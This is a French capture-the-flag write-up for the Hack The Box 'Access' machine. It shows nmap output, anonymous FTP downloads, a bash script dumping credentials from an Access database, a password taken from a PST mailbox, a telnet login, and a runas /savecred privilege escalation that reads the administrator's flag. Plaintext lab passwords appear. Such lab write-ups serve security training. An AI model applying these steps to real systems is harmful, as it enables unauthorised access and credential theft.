# Access writeups by Seyptoo.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/09/6/1551530466-capture-du-2019-03-02-13-40-56.png)](https://image.noelshack.com/fichiers/2019/09/6/1551530466-capture-du-2019-03-02-13-40-56.png)

Informations
----
    Ip : 10.10.10.98       Created by : egre55
    Level : Very easy            Base Points : 20
    
Scan Nmap
----
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: TIMEOUT
    23/tcp open  telnet?
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: MegaCorp
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
 Après avoir effectué le scan, nous avons 3 ports ouverts, le (21) pour le FTP, le (23) pour le telnet, et le (80) pour le httpd. Le FTP peut être accéder en tant que anonymous donc nous allons essayer d'énumérer.
 
FTP Enumeration
----
Pour la connexion au serveur FTP, l'utilisateur et le mot de passe 'anonymous:anonymous'.

    root@Computer:~/htb/writeup/Access# ftp 10.10.10.98
    Connected to 10.10.10.98.
    220 Microsoft FTP Service
    Name (10.10.10.98:root): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password:
    230 User logged in.
    Remote system type is Windows_NT.
    ftp>
 
 La connexion c'est déroulais avec succès donc essayons de lister les fichiers dans le dossier.

    ftp> ls
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    08-23-18  08:16PM       <DIR>          Backups
    08-24-18  09:00PM       <DIR>          Engineer
    226 Transfer complete.
    ftp>
    
Comme vous pouvez le voir, il y'a un dossiers Backups et un dossier Engineer. Dans le dossier Backups il y'a un fichier mdb, pour les bases de données, et dans le dossier Engineer il y'a un fichier zip. Donc nous allons transférer c'est fichiers vers notre machine physique avec la commande **mget [file]**, avant de transférer nous devons passer de ASCII à BINAIRE.

    ftp> ls
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    08-23-18  08:16PM              5652480 backup.mdb
    226 Transfer complete.
    ftp> binary
    200 Type set to I.
    ftp> mget backup.mdb
    mget backup.mdb? y
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    226 Transfer complete.
    5652480 bytes received in 7.70 secs (716.7322 kB/s)
    ftp> cd ..
    250 CWD command successful.
    ftp> cd Engineer
    250 CWD command successful.
    ftp> ls
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    08-24-18  12:16AM                10870 Access Control.zip
    226 Transfer complete.
    ftp> mget "Access Control.zip"
    mget Access Control.zip? y
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    226 Transfer complete.
    10870 bytes received in 0.83 secs (12.7677 kB/s)
    ftp> 

Voilà les fichiers ont été transférer avec succès, sans aucun problème donc nous pouvons quitter le serveur FTP. Et d'énumérer c'est fichiers.

Enumeration MDB
----
Nous allons installer un petit programme pour dump tout ça. Vous devez installé le paquet **mdbtools** avec apt, vous pouvez aussi également utilisé la version GUI avec **mdbtools-gmdb2**.

Pour voir les tables utilisé la commande :

    root@Computer:~/htb/writeup/Access# mdb-tables -1 backup.mdb
    [...SNIP...]
    auth_user
    [...SNIP...]
    
J'ai créer un petit script en bash pour automatisé tout ça, et de chopper les mots de passes plus facilement grâce à mon petit script en bash.

    #!/bin/sh

    name_file=$1
    # This variable will be the file.

    for tables_names in $(mdb-tables -1 $name_file)
    do
      ExportCommand=("mdb-export $name_file $tables_names")
      # Will execute the command.
      if [ "$ExportCommand" != '' ]; then
        $ExportCommand|grep ,26,
      fi
    done
    
Et la sortie du fichier :

    root@Computer:~/htb/writeup/Access# bash server.sh backup.mdb 
    25,"admin","admin",1,"08/23/18 21:11:47",26,
    27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
    28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
    root@Computer:~/htb/writeup/Access#

Parfait nous avons des identifiants. Les mots de passes trouvé peut correspondre au fichier ZIP que nous allons extraire sous Linux.

Archive ZIP
----
    root@Computer:~/htb/writeup/Access# unzip Access\ Control.zip 
    Archive:  Access Control.zip
       skipping: Access Control.pst      unsupported compression method 99
    root@Computer:~/htb/writeup/Access#

Donc visiblement le programme ne peut pas supporter donc après avoir chercher sur le web pendant beaucoup de temps nous allons essayer avec le programme 7zip, et essayer d'extraire ce fichier.

    root@Computer:~/htb/writeup/Access# 7z x Access\ Control.zip 

    7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
    p7zip Version 9.20 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

    Processing archive: Access Control.zip

    Extracting  Access Control.pst
    Enter password (will not be echoed) :


    Everything is Ok

    Size:       271360
    Compressed: 10870
    root@Computer:~/htb/writeup/Access#
    
Parfait avec l'outil 7z, l'extraction fonctionne parfaitement il suffit d'utiliser l'option 'x' pour extraire les fichiers. Donc ça été extrait avec succès donc à la sortie nous avons un fichier pst.

Donc ce fichier il y'a rien de spécial, un code inintellegible. Donc pour lire un fichier PST, vous devez installé readpst. avec la commande apt.

    sudo apt-get install libgsf-1-dev libboost-python-dev

Pour lire le fichier donc il faut tapé la commande ci-dessous :

    root@Computer:~/htb/writeup/Access# readpst Access\ Control.pst -o .
    Opening PST file and indexes...
    Processing Folder "Deleted Items"
            "Access Control" - 2 items done, 0 items skipped.
    root@Computer:~/htb/writeup/Access#

Parfait donc le programme à réussi a lire le fichier PST, visiblement c'est un fichier HTML, donc essayer de mettre dans /var/www/html de lancer le serveur apache2 et de voir directement la sortie.

Donc nous voyons un identifiant :

    The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
    
Donc lançons telnet et on se connecte au serveur. Avec la commande taper ci-dessous.

    root@Computer:~/htb/writeup/Access# telnet 10.10.10.98
    Trying 10.10.10.98...
    Connected to 10.10.10.98.
    Escape character is '^]'.
    Welcome to Microsoft Telnet Service 

    login: security
    password: 

    *===============================================================
    Microsoft Telnet Server.
    *===============================================================
    C:\Users\security> cd Desktop
    C:\Users\security\Desktop> more user.txt
    [...SNIP...]b48913b213a31ff6756d2553d38
    
PrivEsc
----
Le privesc rien de compliqué suffit d'utilisé la commande runnas.

    C:\Users\security\Documents>runas /user:ACCESS\Administrator /savecred "cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\temp\flag"

    C:\Users\security\Documents>more C:\temp\caca
    [...SNIP...]230a8d297e8f933d904cf

    C:\Users\security\Documents>
